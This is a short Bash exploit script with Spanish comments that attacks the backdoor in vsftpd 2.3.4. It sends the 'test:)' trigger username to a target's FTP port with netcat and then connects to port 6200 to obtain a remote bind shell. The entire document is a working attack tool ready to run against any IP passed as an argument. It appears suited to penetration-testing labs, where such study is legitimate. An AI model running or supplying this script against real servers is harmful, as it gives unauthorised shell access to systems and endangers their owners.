#!/bin/bash

# Exploit para vsftpd 2.3.4 - backdoor bind shell
# Autor: javier@kali

# IP del objetivo se pasa como argumento
TARGET=$1

# Puerto estándar del servicio FTP
PORT=21

# Puerto donde se abre la shell si el exploit tiene éxito
SHELL_PORT=6200

# Credenciales especiales que activan la backdoor
TRIGGER_USER="test:)"
TRIGGER_PASS="test"

# Verifica si se ha proporcionado la IP del objetivo
if [ -z "$TARGET" ]; then
    echo "[!] Uso: $0 <IP objetivo>"
    exit 1
fi

echo "[*] Enviando trigger al FTP (${TARGET}:${PORT})..."

# Envía las credenciales maliciosas al servicio FTP usando netcat
# El usuario 'test:)' activa la backdoor si el servidor es vulnerable
{ 
    echo "USER $TRIGGER_USER"; 
    sleep 1
    echo "PASS $TRIGGER_PASS";
    sleep 1
} | nc $TARGET $PORT > /dev/null 2>&1

# Espera unos segundos para que el servidor procese el trigger
sleep 2

echo "[*] Intentando conectar al puerto backdoor (${SHELL_PORT})..."

# Intenta conectarse al puerto 6200, donde debería estar la shell
nc -nv $TARGET $SHELL_PORT
